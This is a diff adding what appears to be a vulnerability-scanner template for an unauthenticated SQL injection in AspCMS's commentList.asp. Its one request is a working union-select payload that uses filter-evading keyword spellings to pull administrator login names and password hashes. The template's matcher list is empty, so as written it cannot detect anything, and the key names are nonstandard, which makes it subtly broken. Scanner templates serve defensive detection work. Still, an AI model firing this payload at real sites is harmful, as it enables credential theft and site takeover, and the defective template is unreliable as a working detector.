@@ -1,0 +1,16 @@
+id: aspcms-commentlist-sqli
+brief:
+    title: AspCMS commentList.asp - SQL Injection
+    by: SleepingBag945
+    level: high
+    about: An SQL injection vulnerability has been identified in the commentList.asp file of AspCMS. Exploiting this vulnerability, an attacker can illicitly acquire the administrator's MD5 password.
+    label:
+        - aspcms
+        - sqli
+        - unauth
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user'
+      signs: []
